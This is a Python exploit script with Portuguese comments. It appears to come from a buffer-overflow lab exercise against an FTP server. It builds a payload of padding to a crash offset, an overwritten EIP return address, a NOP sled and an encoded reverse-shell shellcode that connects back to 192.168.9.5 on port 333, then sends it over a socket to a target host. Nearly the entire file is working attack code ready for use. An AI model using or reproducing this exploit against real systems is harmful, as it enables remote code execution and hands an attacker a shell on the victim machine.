#!/usr/bin/python

import argparse
import socket
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")
parser.add_argument("eip_alvo", type=str, help="EIP Alvo (Ex: 0x080414c3)")


# Analisar os argumentos
args = parser.parse_args()

# Endereço de Memória para EIP Alvo
eip_int = int(args.eip_alvo,16)
eip = pack('<I', eip_int)

# Reverse Shell - 192.168.9.5 333
revshell = ( 
    b""
    b"\xb8\x6b\xa2\x67\x2f\xda\xdf\xd9\x74\x24\xf4\x5d\x29"
    b"\xc9\xb1\x52\x31\x45\x12\x83\xc5\x04\x03\x2e\xac\x85"
    b"\xda\x4c\x58\xcb\x25\xac\x99\xac\xac\x49\xa8\xec\xcb"
    b"\x1a\x9b\xdc\x98\x4e\x10\x96\xcd\x7a\xa3\xda\xd9\x8d"
    b"\x04\x50\x3c\xa0\x95\xc9\x7c\xa3\x15\x10\x51\x03\x27"
    b"\xdb\xa4\x42\x60\x06\x44\x16\x39\x4c\xfb\x86\x4e\x18"
    b"\xc0\x2d\x1c\x8c\x40\xd2\xd5\xaf\x61\x45\x6d\xf6\xa1"
    b"\x64\xa2\x82\xeb\x7e\xa7\xaf\xa2\xf5\x13\x5b\x35\xdf"
    b"\x6d\xa4\x9a\x1e\x42\x57\xe2\x67\x65\x88\x91\x91\x95"
    b"\x35\xa2\x66\xe7\xe1\x27\x7c\x4f\x61\x9f\x58\x71\xa6"
    b"\x46\x2b\x7d\x03\x0c\x73\x62\x92\xc1\x08\x9e\x1f\xe4"
    b"\xde\x16\x5b\xc3\xfa\x73\x3f\x6a\x5b\xde\xee\x93\xbb"
    b"\x81\x4f\x36\xb0\x2c\x9b\x4b\x9b\x38\x68\x66\x23\xb9"
    b"\xe6\xf1\x50\x8b\xa9\xa9\xfe\xa7\x22\x74\xf9\xc8\x18"
    b"\xc0\x95\x36\xa3\x31\xbc\xfc\xf7\x61\xd6\xd5\x77\xea"
    b"\x26\xd9\xad\xbd\x76\x75\x1e\x7e\x26\x35\xce\x16\x2c"
    b"\xba\x31\x06\x4f\x10\x5a\xad\xaa\xf3\xa5\x9a\xbd\x06"
    b"\x4e\xd9\xbd\x09\xc3\x54\x5b\x63\xcb\x30\xf4\x1c\x72"
    b"\x19\x8e\xbd\x7b\xb7\xeb\xfe\xf0\x34\x0c\xb0\xf0\x31"
    b"\x1e\x25\xf1\x0f\x7c\xe0\x0e\xba\xe8\x6e\x9c\x21\xe8"
    b"\xf9\xbd\xfd\xbf\xae\x70\xf4\x55\x43\x2a\xae\x4b\x9e"
    b"\xaa\x89\xcf\x45\x0f\x17\xce\x08\x2b\x33\xc0\xd4\xb4"
    b"\x7f\xb4\x88\xe2\x29\x62\x6f\x5d\x98\xdc\x39\x32\x72"
    b"\x88\xbc\x78\x45\xce\xc0\x54\x33\x2e\x70\x01\x02\x51"
    b"\xbd\xc5\x82\x2a\xa3\x75\x6c\xe1\x67\x95\x8f\x23\x92"
    b"\x3e\x16\xa6\x1f\x23\xa9\x1d\x63\x5a\x2a\x97\x1c\x99"
    b"\x32\xd2\x19\xe5\xf4\x0f\x50\x76\x91\x2f\xc7\x77\xb0"
    )

    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
payload = b"A"*offset
payload += eip
payload += b"\x90" * 16 # NOPs -> COMO CALCULAR ?
# Foi necessário usar 16 NOPs para funcionar, com 12 não funcionava de jeito nenhum.
payload += revshell
payload += b"\r\n" # PARA O FTPSERVER FOI NECESSÁRIO



try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP: {} e Shellcode de {} bytes [+]\n".format(str(offset), str(eip), len(revshell)))
    client.send(payload)
    client.recv(1024)
    client.close()
except ConnectionResetError:
    print(f"Reset Error!")